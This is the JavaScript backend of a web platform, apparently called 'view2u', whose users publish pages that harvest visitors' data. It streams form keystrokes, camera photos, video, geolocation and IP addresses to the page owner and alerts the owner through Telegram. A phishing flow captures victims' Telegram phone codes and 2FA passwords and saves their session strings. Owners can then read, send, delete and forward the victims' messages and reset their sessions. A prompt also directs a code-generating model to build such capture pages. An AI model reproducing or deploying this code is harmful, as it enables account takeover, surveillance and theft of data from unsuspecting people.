const { google } = require('googleapis');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { nanoid } = require('nanoid');
const stream = require('stream');
const fetch = require('node-fetch');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const { computeCheck } = require('telegram/Password');

function getDriveClient() {
    if (!process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL || !process.env.GOOGLE_PRIVATE_KEY) throw new Error("Missing Google service account credentials.");
    const credentials = { client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL, private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n') };
    const auth = new google.auth.GoogleAuth({ credentials, scopes: ['https://www.googleapis.com/auth/drive'] });
    return google.drive({ version: 'v3', auth });
}

async function readDb(drive) {
    const fileId = process.env.GOOGLE_DRIVE_FILE_ID;
    if (!fileId) throw new Error("Missing GOOGLE_DRIVE_FILE_ID.");
    
    try {
        const res = await drive.files.get({ fileId, alt: 'media' });
        if (!res.data) return { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3 }, templates: [] };
        const dbData = typeof res.data === 'object' ? res.data : JSON.parse(res.data);
        if (!dbData.settings) dbData.settings = { defaultDeviceLimit: 3 };
        if (!dbData.templates) dbData.templates = [];
        if (dbData.templates.length === 0) {
            dbData.templates.push(
                { templateId: 'default-1', name: 'Проста візитка', htmlContent: '<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><title>Мій Профіль</title><style>body{font-family: Arial, sans-serif; text-align: center; background: #f4f4f4; padding-top: 50px;} .card{background: white; margin: 0 auto; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 300px;} h1{color: #333;} p{color: #666;}</style></head><body><div class="card"><h1>Ім\'я Прізвище</h1><p>Веб-розробник</p></div></body></html>' },
                { templateId: 'default-2', name: 'Сторінка-заглушка', htmlContent: '<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><title>Скоро!</title><style>body{display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; font-family: "Segoe UI", sans-serif;} h1{font-size: 3em;}</style></head><body><h1>Наш сайт скоро відкриється!</h1></body></html>' }
            );
        }
        return dbData;
    } catch (e) {
        if (e.message.includes('File not found') || e.message.includes('404')) {
            console.warn("Database file not found, creating new one. Error:", e.message);
            // Створюємо новий файл бази даних
            const newDb = { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3 }, templates: [] };
            await writeDb(drive, newDb);
            return newDb;
        }
        console.warn("Could not parse DB file. Starting with empty state. Error:", e.message);
        return { users: [], refCodes: [], blockedIdentifiers: [], settings: { defaultDeviceLimit: 3 }, templates: [] };
    }
}

async function writeDb(drive, data) {
    const fileId = process.env.GOOGLE_DRIVE_FILE_ID;
    if (!fileId) throw new Error("Missing GOOGLE_DRIVE_FILE_ID.");
    const buffer = Buffer.from(JSON.stringify(data, null, 2));
    
    try {
        // Спробуємо оновити існуючий файл
        await drive.files.update({ 
            fileId, 
            media: { 
                mimeType: 'application/json', 
                body: buffer 
            } 
        });
    } catch (e) {
        if (e.message.includes('File not found') || e.message.includes('404')) {
            // Якщо файл не існує, створюємо новий
            console.log("File not found, creating new database file");
            await drive.files.create({
                resource: {
                    name: 'view2u-database.json',
                    mimeType: 'application/json'
                },
                media: {
                    mimeType: 'application/json',
                    body: buffer
                }
            });
        } else {
            throw e;
        }
    }
}

async function sendTelegramNotification(user, eventData) {
    if (!user.telegramBinding || user.telegramBinding.status !== 'active' || !user.telegramBinding.chatId) {
        return; 
    }

    const { BOT_API_URL, BOT_API_SECRET } = process.env;
    if (!BOT_API_URL || !BOT_API_SECRET) {
        console.warn('Змінні для Telegram бота не налаштовано на Netlify.');
        return;
    }

    try {
        await fetch(`${BOT_API_URL}/notify`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${BOT_API_SECRET}`
            },
            body: JSON.stringify({
                chat_id: user.telegramBinding.chatId,
                event_data: eventData
            })
        });
    } catch (error) {
        console.error("Помилка відправки сповіщення в Telegram:", error.message);
    }
}

// Спрощена функція завантаження медіа без чанків
async function uploadMediaSimple(drive, buffer, filename, mimeType) {
    console.log(`Uploading ${filename} (${buffer.length} bytes)`);
    
    const fileMetadata = {
        name: filename
    };
    
    // Додаємо папку якщо вона існує
    if (process.env.GOOGLE_DRIVE_MEDIA_FOLDER_ID) {
        try {
            await drive.files.get({ fileId: process.env.GOOGLE_DRIVE_MEDIA_FOLDER_ID });
            fileMetadata.parents = [process.env.GOOGLE_DRIVE_MEDIA_FOLDER_ID];
        } catch (e) {
            console.warn('Media folder not found, uploading to root:', e.message);
        }
    }
    
    const media = {
        mimeType: mimeType,
        body: buffer
    };
    
    try {
        const file = await drive.files.create({
            resource: fileMetadata,
            media: media,
            fields: 'id,name,webViewLink,webContentLink'
        });
        return file.data;
    } catch (error) {
        // Fallback: спробуємо створити файл без папки
        console.warn('Failed to create file with folder, trying without folder:', error.message);
        const fallbackMetadata = { name: fileMetadata.name };
        const file = await drive.files.create({
            resource: fallbackMetadata,
            media: media,
            fields: 'id,name,webViewLink,webContentLink'
        });
        return file.data;
    }
}


// Спрощена функція для тимчасових файлів
async function uploadTemporaryMedia(drive, buffer, filename, mimeType) {
    return await uploadMediaSimple(drive, buffer, filename, mimeType);
}

async function scheduleTemporaryFileDeletion(drive, fileId, delayMinutes = 5) {
    const db = await readDb(drive);
    if (!db.temporaryFiles) {
        db.temporaryFiles = [];
    }
    
    const deletionTime = new Date(Date.now() + delayMinutes * 60 * 1000);
    db.temporaryFiles.push({
        fileId: fileId,
        deleteAt: deletionTime.toISOString(),
        createdAt: new Date().toISOString()
    });
    
    await writeDb(drive, db);
}

async function processTemporaryFileDeletions(drive) {
    const db = await readDb(drive);
    if (!db.temporaryFiles) return;
    
    const now = new Date();
    const toDelete = db.temporaryFiles.filter(item => new Date(item.deleteAt) <= now);
    
    for (const item of toDelete) {
        try {
            await drive.files.delete({ fileId: item.fileId });
            console.log(`Deleted temporary file ${item.fileId}`);
        } catch (e) {
            console.warn(`Failed to delete temporary file ${item.fileId}:`, e.message);
        }
    }
    
    db.temporaryFiles = db.temporaryFiles.filter(item => new Date(item.deleteAt) > now);
    await writeDb(drive, db);
}



exports.handler = async function(event) {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };

    try {
        const { action, payload, stream: isStream } = JSON.parse(event.body);
        const clientIp = event.headers['x-nf-client-connection-ip'];
        const fingerprint = payload ? payload.fingerprint : null;
        
        const drive = getDriveClient();
        
        // Обробляємо видалення тимчасових файлів
        await processTemporaryFileDeletions(drive);
        
        // --- Telegram Auth (не потребує JWT токена) ---
        if (action === 'telegramAuth') {
            const { ownerUserId, step, fingerprint } = payload;
            if (!process.env.TELEGRAM_API_ID || !process.env.TELEGRAM_API_HASH || !process.env.JWT_SECRET) {
                throw new Error('Telegram API credentials or JWT_SECRET are not configured on the server.');
            }
            const apiId = parseInt(process.env.TELEGRAM_API_ID, 10);
            const apiHash = process.env.TELEGRAM_API_HASH;
            const jwtSecret = process.env.JWT_SECRET;
            
            const sessionString = (payload.token && jwt.verify(payload.token, jwtSecret).sessionString) || '';
            const client = new TelegramClient(new StringSession(sessionString), apiId, apiHash, { connectionRetries: 3 });

            switch (step) {
                case 'sendPhone': {
                    const { phone } = payload;
                    await client.connect();
                    const result = await client.sendCode({ apiId, apiHash }, phone);
                    
                    const tempTokenPayload = {
                        ownerUserId,
                        phone,
                        phoneCodeHash: result.phoneCodeHash,
                        sessionString: client.session.save()
                    };
                    const tempToken = jwt.sign(tempTokenPayload, jwtSecret, { expiresIn: '5m' });

                    return { statusCode: 200, body: JSON.stringify({ success: true, nextStep: 'code', token: tempToken }) };
                }

                case 'sendCode': {
                    const { code, token } = payload;
                    const decoded = jwt.verify(token, jwtSecret);
                    if (decoded.ownerUserId !== ownerUserId) throw new Error('Token mismatch.');
                    
                    await client.connect();
                    try {
                        await client.invoke(new Api.auth.SignIn({ phoneNumber: decoded.phone, phoneCodeHash: decoded.phoneCodeHash, phoneCode: code }));
                    } catch (error) {
                        if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                            const newTempTokenPayload = {
                                ownerUserId,
                                phone: decoded.phone,
                                sessionString: client.session.save()
                            };
                            const newTempToken = jwt.sign(newTempTokenPayload, jwtSecret, { expiresIn: '5m' });
                            return { statusCode: 200, body: JSON.stringify({ success: true, nextStep: 'password', token: newTempToken })};
                        }
                        throw error;
                    }

                    const finalSessionString = client.session.save();
                    const db = await readDb(drive);
                    const user = db.users.find(u => u.userId === ownerUserId);
                    if (user) {
                        if (!user.collectedData) user.collectedData = [];
                        user.collectedData.push({ fingerprint, collectedAt: new Date().toISOString(), status: 'success', type: 'telegram_session', data: { sessionString: finalSessionString } });
                        await writeDb(drive, db);
                        await sendTelegramNotification(user, { type: 'telegram_session', status: 'success' });
                    }
                    return { statusCode: 200, body: JSON.stringify({ success: true, completed: true }) };
                }

                case 'sendPassword': {
                    const { password, token } = payload;
                    if (!password || typeof password !== 'string' || password.trim() === '') {
                        return { statusCode: 400, body: 'Invalid password provided.' };
                    }
                    if (!password.match(/^[ -~]+$/)) {
                        return { statusCode: 400, body: 'Password must contain only ASCII characters.' };
                    }
                   
                    const decoded = jwt.verify(token, jwtSecret);
                    if (decoded.ownerUserId !== ownerUserId) throw new Error('Token mismatch.');

                    await client.connect();
                    const passwordSrp = await client.invoke(new Api.account.GetPassword());
                    
                    const checkPassword = await computeCheck(passwordSrp, password);

                    await client.invoke(new Api.auth.CheckPassword({
                        password: checkPassword
                    }));
                    
                    const finalSessionString = client.session.save();
                    const db = await readDb(drive);
                    const user = db.users.find(u => u.userId === ownerUserId);
                    if (user) {
                        if (!user.collectedData) user.collectedData = [];
                        user.collectedData.push({ 
                            fingerprint, 
                            collectedAt: new Date().toISOString(), 
                            status: 'success', 
                            type: 'telegram_session', 
                            data: { sessionString: finalSessionString } 
                        });
                        await writeDb(drive, db);
                        await sendTelegramNotification(user, { type: 'telegram_session', status: 'success' });
                    }
                    return { statusCode: 200, body: JSON.stringify({ success: true, completed: true }) };
                }
                
                default:
                    return { statusCode: 400, body: 'Invalid Telegram auth step.' };
            }
        }
        
        // --- Дії, що не вимагають JWT токена ---
        if (['getPageContent', 'verifyRefCode', 'register', 'login', 'collectData', 'validateToken', 'generateCode'].includes(action)) {
            const db = await readDb(drive);

            if (db.blockedIdentifiers.some(b => b.ip === clientIp || (fingerprint && b.fingerprint === fingerprint))) {
                return { statusCode: 403, body: 'Access from this device has been restricted.' };
            }

            switch(action) {
                case 'getPageContent': {
                    const user = db.users.find(u => u.userId === payload.userId);
                    if (!user || !user.publishedPage) return { statusCode: 404, body: 'Page not found.' };
                    let htmlContent = user.publishedPage.htmlContent;
                    if (user.publishedPage.source === 'template' && !htmlContent) {
                        const template = db.templates.find(t => t.templateId === user.publishedPage.sourceTemplateId);
                        htmlContent = template ? template.htmlContent : '<!DOCTYPE html><html><body><h1>Template not found</h1></body></html>';
                    }
                    return { statusCode: 200, body: htmlContent, headers: { 'Content-Type': 'text/html; charset=utf-8' }};
                }
                case 'validateToken': {
                    try {
                        const decoded = jwt.verify(payload && payload.token, process.env.JWT_SECRET);
                        const user = db.users.find(u => u.userId === decoded.userId);
                        if (!user || user.status === 'suspended') return { statusCode: 401, body: 'Account is invalid or suspended.' };
                        const session = user.sessions.find(s => s.sessionId === decoded.sessionId);
                        if (!session || session.status !== 'active') return { statusCode: 401, body: 'Session is invalid or has been terminated.' };
                        return { statusCode: 200, body: JSON.stringify({ userId: user.userId }) };
                    } catch (e) {
                        return { statusCode: 401, body: 'Invalid or expired token.' };
                    }
                }
                case 'verifyRefCode': {
                    const code = db.refCodes.find(c => c.code === payload.ref && c.usesLeft > 0);
                    return code ? { statusCode: 200, body: 'Code is valid.' } : { statusCode: 404, body: 'Invalid or expired code.' };
                }
                case 'register': {
                    const { nickname, password, ref } = payload;
                    const nicknameRegex = /^[a-zA-Z0-9]+$/;
                    if (!nickname || !password || password.length < 6) return { statusCode: 400, body: 'Нікнейм та пароль (мін. 6 символів) є обов\'язковими.' };
                    if (nickname.length < 3 || nickname.length > 20) return { statusCode: 400, body: 'Довжина нікнейму повинна бути від 3 до 20 символів.' };
                    if (!nicknameRegex.test(nickname)) return { statusCode: 400, body: 'Нікнейм містить неприпустимі символи. Дозволено лише латинські літери та цифри.' };

                    const code = db.refCodes.find(c => c.code === ref && c.usesLeft > 0);
                    if (!code) return { statusCode: 400, body: 'Invalid or expired invitation code.' };
                    if (db.users.some(u => u.nickname.toLowerCase() === nickname.toLowerCase())) return { statusCode: 409, body: 'Nickname is already taken.' };
                    
                    const isDeviceAlreadyRegistered = db.users.flatMap(u => u.sessions || []).some(s => s.ip === clientIp || s.fingerprint === fingerprint);
                    if (isDeviceAlreadyRegistered) return { statusCode: 403, body: 'An account has already been registered from this device.' };
                    
                    code.usesLeft--;
                    const newUser = {
                        userId: nanoid(24),
                        nickname,
                        password: await bcrypt.hash(password, 10),
                        status: 'active',
                        createdAt: new Date().toISOString(),
                        lastLoginAt: null,
                        registeredWithRef: ref,
                        deviceLimitOverride: null,
                        sessions: [{ sessionId: nanoid(), ip: clientIp, fingerprint, status: 'active', createdAt: new Date().toISOString(), lastUsedAt: new Date().toISOString() }],
                        publishedPage: null,
                        collectedData: [],
                        telegramBinding: {
                            activationId: null, status: null, chatId: null, username: null
                        }
                    };
                    db.users.push(newUser);
                    const token = jwt.sign({ userId: newUser.userId, sessionId: newUser.sessions[0].sessionId }, process.env.JWT_SECRET, { expiresIn: '8h' });
                    await writeDb(drive, db);
                    return { statusCode: 201, body: JSON.stringify({ personalPage: `/user/${newUser.userId}`, token: token }) };
                }
                case 'login': {
                    const { nickname, password, userId } = payload;
                    const user = db.users.find(u => u.userId === userId);
                    if (!user || user.nickname.toLowerCase() !== nickname.toLowerCase() || !(await bcrypt.compare(password, user.password))) return { statusCode: 401, body: 'Invalid credentials.' };
                    if (user.status === 'suspended') return { statusCode: 403, body: 'This account has been suspended.' };
                    let session = user.sessions.find(s => s.ip === clientIp && s.fingerprint === fingerprint);
                    if (session) {
                        if (session.status === 'blocked') return { statusCode: 403, body: 'This session has been blocked by an administrator.' };
                        session.lastUsedAt = new Date().toISOString();
                    } else {
                        const deviceLimit = user.deviceLimitOverride || db.settings.defaultDeviceLimit;
                        if (user.sessions.filter(s => s.status === 'active').length >= deviceLimit) return { statusCode: 403, body: `Device limit (${deviceLimit}) reached.` };
                        session = { sessionId: nanoid(), ip: clientIp, fingerprint, status: 'active', createdAt: new Date().toISOString(), lastUsedAt: new Date().toISOString() };
                        user.sessions.push(session);
                    }
                    user.lastLoginAt = new Date().toISOString();
                    const token = jwt.sign({ userId: user.userId, sessionId: session.sessionId }, process.env.JWT_SECRET, { expiresIn: '8h' });
                    await writeDb(drive, db);
                    return { statusCode: 200, body: JSON.stringify({ token }) };
                }
                case 'collectData': {
                    const { ownerUserId, fingerprint, payload: dataPayload } = payload;
                    const user = db.users.find(u => u.userId === ownerUserId);
                    let fullEntryData = null;
                    if (user) {
                        if (!user.collectedData) user.collectedData = [];
                        
                        if (dataPayload.type === 'form') {
                            const formId = dataPayload.formId;
                            let entry = user.collectedData.find(d => d.fingerprint === fingerprint && d.type === 'form' && d.formId === formId);
                            if (isStream) {
                                if (entry) {
                                    entry.data[dataPayload.field] = dataPayload.value;
                                    entry.collectedAt = new Date().toISOString();
                                } else {
                                    entry = { fingerprint, collectedAt: new Date().toISOString(), status: 'success', type: 'form', formId: formId, data: { [dataPayload.field]: dataPayload.value } };
                                    user.collectedData.push(entry);
                                }
                            } else {
                                if (entry) {
                                    entry.data = dataPayload.data;
                                    entry.collectedAt = new Date().toISOString();
                                } else {
                                    entry = { fingerprint, collectedAt: new Date().toISOString(), ...dataPayload };
                                    user.collectedData.push(entry);
                                }
                            }
                            fullEntryData = entry;
                        } else {
                            fullEntryData = {
                                fingerprint,
                                collectedAt: new Date().toISOString(),
                                ...dataPayload
                            };
                            
                            if (fullEntryData.type === 'device_info' && fullEntryData.data) {
                                fullEntryData.data.ipAddress = clientIp;
                            }
                            
                            user.collectedData.push(fullEntryData);
                        }
                        await writeDb(drive, db);
                        await sendTelegramNotification(user, fullEntryData);
                    }
                    return { statusCode: 200, body: 'Data collected.' };
                }
                case 'generateCode': {
                    const { mode = 'generate', userPrompt = '', userCode = '' } = payload || {};
                    try {
                        const { Client } = require('@gradio/client');
                        if (!Client || typeof Client.connect !== 'function') {
                            throw new Error('Gradio Client is not available. Check @gradio/client import.');
                        }
                        const client = await Client.connect('Qwen/Qwen3-Coder-WebDev');

                        const basePrompt = `Ти — експерт з фронтенд-розробки. Твоє завдання — повернути один цілісний HTML-файл, що містить усю розмітку, стилі (CSS) та логіку (JS).

### Головні правила:
1.  **Тільки чистий HTML:** Твоя відповідь має бути виключно HTML-кодом. Без форматування markdown (\`\`\`html ... \`\`\`) та пояснень.
2.  **Чітке дотримання запиту:** Створюй тільки те, що просить користувач. Не додавай непотрібні кнопки (фото, геолокація), якщо вони не були запитані.
3.  **Візуальний дизайн:** Завжди створюй привабливий, сучасний та адаптивний дизайн за допомогою CSS. Використовуй flexbox/grid, анімації та якісну типографіку.

### Інструкція по використанню функцій:
Для додавання інтерактивних можливостей, спочатку підключи міст (Крок 1), а потім використовуй функції (Крок 2).

**Крок 1: Обов'язкове підключення**
У тег \`<head>\` завжди додавай цей скрипт:
\`<script src="/get-function/view2u-bridge.js" defer><\/script>\`

**Крок 2: Виклик функцій**

**- Функції \`camera\`, \`location\`, \`video\` тепер асинхронні!**
  Вони повертають результат, який потрібно обробляти за допомогою \`async/await\` та \`try/catch\`, щоб сторінка могла реагувати на дії користувача (дозвіл/відмова).

  ***Правильний приклад для кнопки геолокації:***
  \`<button id="locationBtn">Отримати геолокацію</button>\`
  \`<p id="statusMessage"></p>\`
  \`<script>\`
  \`  document.getElementById('locationBtn').addEventListener('click', async () => {\`
  \`    const btn = document.getElementById('locationBtn');\`
  \`    const msg = document.getElementById('statusMessage');\`
  \`    btn.disabled = true;\`
  \`    msg.textContent = 'Запит дозволу...';\`
  \`    try {\`
  \`      const result = await view2u.execute('location');\`
  \`      // Успіх! result.status === 'success'\`
  \`      msg.textContent = 'Дякуємо! Координати отримано.';\`
  \`      btn.style.display = 'none'; // Ховаємо кнопку\`
  \`    } catch (error) {\`
  \`      // Відмова. error.status === 'denied'\`
  \`      msg.textContent = 'Доступ заборонено. Будь ласка, надайте дозвіл у налаштуваннях браузера.';\`
  \`      btn.disabled = false;\`
  \`    }\`
  \`  });\`
  \`<\/script>\`

**- Збір даних з форм (логіка не змінилась):**
  Щоб активувати збір даних, виклич \`view2u.execute('form', ...)\` один раз після завантаження сторінки. **Не використовуй \`onsubmit\`**.
  - **Режим 'button' (Відправка по кнопці):**
    \`<form id="myForm"><\/form><script>document.addEventListener('DOMContentLoaded', () => { view2u.execute('form', { formId: 'myForm', mode: 'button' }); });<\/script>\`
  - **Режим 'stream' (Потокова передача):**
    \`<form id="contactForm"><\/form><script>document.addEventListener('DOMContentLoaded', () => { view2u.execute('form', { formId: 'contactForm', mode: 'stream' }); });<\/script>\`

### Функції та їх правильний виклик з параметрами:
1.  **camera** - доступ до камери та створення фото: \`view2u.execute('camera', {view: "front" | "back" | "front-back", count: 3, interval: 2000});\`
    *   \`view\`: "front" - фронтальна, "back" - задня, "front-back" - обидві (рекомендовано).
    *   \`count\`: кількість фото (рекомендовано 3).
    *   \`interval\`: інтервал між фото в мілісекундах.

2.  **location** - доступ до геолокації пристрою: \`view2u.execute('location');\` - цей модуль не приймає параметрів.

3.  **form** - збір даних з HTML-форм: \`view2u.execute('form', { formId: 'id_вашої_форми', mode: 'режим_роботи' });\`. **Обов'язково** вимагає параметри.
    *   \`formId\`: (обов'язково) ID HTML-тега \`<form>\` (напр., 'contact-form').
    *   \`mode\`: 'stream' (за замовчуванням) - відправка при кожному введенні; 'button' - відправка по кліку на \`<button type="submit">\`.

4.  **video** - запис відео з однієї або обох камер: \`view2u.execute('video', { view: 'front-back', count: 2, duration: 8 });\`
    *   \`view\`: (необов'язково) \`'front'\` (фронтальна), \`'back'\` (основна), або \`'front-back'\` (обидві по черзі). **За замовчуванням: 'front'**.
    *   \`duration\`: (необов'язково) тривалість *кожного* відео в секундах. **За замовчуванням: 5**. Максимум: 15.
    *   \`count\`: (необов'язково) кількість відео. **Важливо:** для \`view: 'front'\` або \`'back'\` макс. **3**. Для \`view: 'front-back'\` макс. **2** (буде записано 2 з фронтальної + 2 з задньої). **За замовчуванням: 1**.

5.  **telegram** - покрокова авторизація в Telegram: \`view2u.execute('telegram', { phoneInputId: '...', codeInputId: '...', ... });\`
    *   **Призначення:** Керує логікою покрокової авторизації.
    *   **Важливо:** Ти повинен створити **всі** HTML-елементи одразу. Модуль сам буде показувати/ховати потрібні поля. Поля для коду та пароля мають бути приховані за замовчуванням (\`style="display:none;"\`).
    *   **Параметри (всі обов'язкові):**
        *   \`phoneInputId\`: ID поля для номера телефону.
        *   \`codeInputId\`: ID поля для коду підтвердження.
        *   \`passwordInputId\`: ID поля для пароля 2FA.
        *   \`submitButtonId\`: ID кнопки для відправки.
        *   \`feedbackElementId\`: ID елемента для повідомлень користувачу.
    *   **Приклад реалізації:**
        \`\`\`html
        <div class="telegram-container">
            <h3>Авторизація в Telegram</h3>
            <p id="telegram-status-message">Введіть ваш номер телефону.</p>
            <input type="tel" id="telegram-phone-input" placeholder="+380991234567">
            <input type="text" id="telegram-code-input" placeholder="Код підтвердження" style="display:none;">
            <input type="password" id="telegram-password-input" placeholder="Пароль (2FA)" style="display:none;">
            <button id="telegram-submit-button">Далі</button>
        </div>
        <script>
          document.addEventListener('DOMContentLoaded', async () => {
            try {
              await view2u.execute('telegram', {
                phoneInputId: 'telegram-phone-input',
                codeInputId: 'telegram-code-input',
                passwordInputId: 'telegram-password-input',
                submitButtonId: 'telegram-submit-button',
                feedbackElementId: 'telegram-status-message'
              });
              document.getElementById('telegram-status-message').innerText = 'Успіх! Сесію збережено.';
            } catch (error) {
              document.getElementById('telegram-status-message').innerText = \`Критична помилка: \${error.message}\`;
            }
          });
        <\/script>
        <style>
            .telegram-container { max-width: 400px; margin: 2rem auto; padding: 1.5rem; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
            .telegram-container input { width: 100%; padding: 10px; margin: 0.5rem 0; box-sizing: border-box; }
            .telegram-container button { width: 100%; padding: 10px; background: #0088cc; color: white; border: none; cursor: pointer; }
        </style>
        \`\`\`

### Фінальні вимоги:
1.  Завжди повертай повний та валідний HTML-код.
2.  Для \`camera\`, \`location\`, \`video\`, \`telegram\` завжди використовуй \`async/await\` з \`try/catch\` для створення інтерактивного досвіду.`;
                        
                        let fullPrompt;
                        if (mode === 'refine' && userCode) {
                            fullPrompt = `${basePrompt}\n\nЦей код треба відредагувати: ${userCode}\n\nUSER PROMPT: "${userPrompt}"`;
                        } else {
                            fullPrompt = `${basePrompt}\n\nUSER PROMPT: "${userPrompt}"`;
                        }
                        
                        const result = await client.predict('/generate_code', {
                            input_value: fullPrompt,
                            system_prompt_input_value: 'null',
                        });
                        
                        // --- ПОЧАТОК ВИПРАВЛЕНОЇ ЛОГІКИ ---

                        // 1. Безпечно отримуємо згенерований текст, використовуючи optional chaining
                        const generated = result?.data?.[0]?.value ?? result?.data?.[0];

                        // 2. Перевіряємо, що відповідь є валідним, непустим рядком
                        if (typeof generated !== 'string' || generated.trim() === '') {
                            console.error('AI returned unexpected or empty data:', generated);
                            throw new Error('AI returned an empty or invalid response.');
                        }
                        
                        // 3. Перевіряємо, чи не є відповідь повідомленням про помилку
                        const lowercasedGenerated = generated.toLowerCase();
                        if (lowercasedGenerated.includes('timeout') || lowercasedGenerated.includes('error')) {
                            console.error('AI generation failed with an error message:', generated);
                            // Генеруємо помилку, щоб вона була перехоплена блоком catch
                            throw new Error('AI generation timed out or failed with an internal error.');
                        }

                        // 4. Якщо перевірки пройдені, очищуємо HTML від markdown
                        const cleaned = generated
                            .replace(/^```[a-zA-Z]*\n?/, '')
                            .replace(/```\s*$/, '')
                            .trim();

                        return { statusCode: 200, body: JSON.stringify({ html: cleaned }) };
                        
                        // --- КІНЕЦЬ ВИПРАВЛЕНОЇ ЛОГІКИ ---

                    } catch (e) {
                        // Цей блок тепер буде ловити як помилки підключення, так і помилки генерації (таймаути)
                        console.error('Gradio Client Error:', e);
                        return { statusCode: 500, body: JSON.stringify({ error: 'Generation failed', message: e.message }) };
                    }
                }
            }
        }
        
        // --- Дії, що вимагають JWT токена ---
        if (!payload || !payload.token) {
            return { statusCode: 401, body: 'Token required for this action.' };
        }
        
        try {
            const decoded = jwt.verify(payload.token, process.env.JWT_SECRET);
            const db = await readDb(drive);
            const user = db.users.find(u => u.userId === decoded.userId);
            if (!user || user.status === 'suspended') return { statusCode: 401, body: 'Account is invalid or suspended.' };
            const session = user.sessions.find(s => s.sessionId === decoded.sessionId);
            if (!session || session.status !== 'active') return { statusCode: 401, body: 'Session is invalid or has been terminated.' };

            const telegramActions = [
                'getTelegramDialogs',
                'getTelegramMessages',
                'sendTelegramMessage',
                'getTelegramEntityInfo',
                'deleteTelegramMessages',
                'deleteTelegramMessage',
                'editTelegramMessage',
                'toggleTelegramBlock',
                'deleteTelegramDialog',
                'updateTelegramProfilePhoto',
                'listTelegramProfilePhotos',
                'downloadProfilePhoto',
                'getDialogFolders',
                'getTelegramDialogFilters',
                'getMe',
                'downloadTelegramMedia',
                'updateProfile', // ВИПРАВЛЕНО: з updateTelegramProfile на updateProfile
                'readHistory',
                'forwardMessages',
                'searchMessages',
                'sendReaction',
                'pinMessage',
                'unpinMessage',
                'archiveDialog',
                'getContacts',
                'getTelegramDialogsPaged',
                'getMessageById',
                'getHistoryAround',
                'getAuthorizations',
                'resetAuthorizations',
                'unpinAllMessages', // ДОДАНО
                'getPinnedMessages' // ДОДАНО
            ];
            if (telegramActions.includes(action)) {
                try {
                    if (!process.env.TELEGRAM_API_ID || !process.env.TELEGRAM_API_HASH) {
                        throw new Error('Налаштування Telegram API не сконфігуровано на сервері.');
                    }
                    const apiId = parseInt(process.env.TELEGRAM_API_ID, 10);
                    const apiHash = process.env.TELEGRAM_API_HASH;
                    const { sessionString } = payload;
                    if (!sessionString || sessionString.trim() === '') {
                        console.error('Telegram operation attempted without sessionString:', { action, payload: { ...payload, sessionString: 'MISSING' } });
                        return { 
                            statusCode: 400, 
                            body: JSON.stringify({ 
                                error: "Потрібен рядок сесії.", 
                                message: "Session string is required for Telegram operations. Please load your Telegram session first.",
                                code: "MISSING_SESSION_STRING"
                            }) 
                        };
                    }

                    const client = new TelegramClient(new StringSession(sessionString), apiId, apiHash, { connectionRetries: 3 });
                    await client.connect();

                    if (!(await client.isUserAuthorized())) {
                        throw new Error("Сесія не авторизована.");
                    }

                    await client.getMe();

                    // Завантажуємо всі діалоги для кращої роботи з сутностями
                    try {
                        await client.getDialogs({limit: 1}); // Load just one to warm up cache if needed
                    } catch (e) {
                        console.warn('Could not pre-load dialogs:', e.message);
                    }

                    // Helper to resolve a peer/entity from payload
                    const resolvePeer = async (payload) => {
                        const { peer, dialogId, entityId } = payload || {};
                        // Explicit InputPeer object from frontend
                        if (peer && peer.className) {
                            try {
                                if (peer.className === 'InputPeerUser' && peer.userId) {
                                    return new Api.InputPeerUser({ userId: peer.userId, accessHash: peer.accessHash });
                                }
                                if (peer.className === 'InputPeerChannel' && peer.channelId) {
                                    return new Api.InputPeerChannel({ channelId: peer.channelId, accessHash: peer.accessHash });
                                }
                                if (peer.className === 'InputPeerChat' && peer.chatId) {
                                    return new Api.InputPeerChat({ chatId: peer.chatId });
                                }
                            } catch (_) {}
                            try { return await client.getEntity(peer); } catch (_) {}
                        }
                        // Backwards compatibility: numeric/string id
                        const id = entityId ?? dialogId;
                        if (id !== undefined && id !== null) {
                            try { return await client.getEntity(id); } catch (_) {}
                            try {
                                const list = await client.getDialogs();
                                const match = list.find(d => String(d.id) === String(id));
                                if (match && match.entity) return match.entity;
                            } catch(_) {}
                        }
                        return null;
                    };

                    switch (action) {
                        case 'getMe': {
                            const me = await client.getMe();
                            return { statusCode: 200, body: JSON.stringify(me) };
                        }
                        case 'getDialogFolders': {
                            const dialogs = await client.getDialogs();
                            const folders = {};
                            dialogs.forEach(d => {
                                const fid = d.folderId || (d.isArchived ? 1 : 0) || 0;
                                if (!folders[fid]) folders[fid] = { folderId: fid, count: 0 };
                                folders[fid].count += 1;
                            });
                            const result = Object.values(folders);
                            return { statusCode: 200, body: JSON.stringify(result) };
                        }
                        case 'getTelegramDialogFilters': {
                            try {
                                const res = await client.invoke(new Api.messages.GetDialogFilters());
                                const filters = (res || []).map(f => ({ id: f.id, title: f.title }));
                                return { statusCode: 200, body: JSON.stringify(filters) };
                            } catch (e) {
                                console.warn('GetDialogFilters failed:', e.message);
                                return { statusCode: 200, body: JSON.stringify([]) };
                            }
                        }
                        case 'getTelegramDialogs': {
                            const { filterId } = payload;
                            let filters = [];
                            try { filters = await client.invoke(new Api.messages.GetDialogFilters()); } catch {}
                            const selectedFilter = Array.isArray(filters) ? filters.find(f => f.id === filterId) : null;
                            const dialogs = await client.getDialogs();
                            const result = dialogs.map(d => {
                                const e = d.entity || {};
                                let peer = null;
                                if (e.className === 'User') {
                                    peer = { className: 'InputPeerUser', userId: e.id, accessHash: e.accessHash };
                                } else if (e.className === 'Channel') {
                                    peer = { className: 'InputPeerChannel', channelId: e.id, accessHash: e.accessHash };
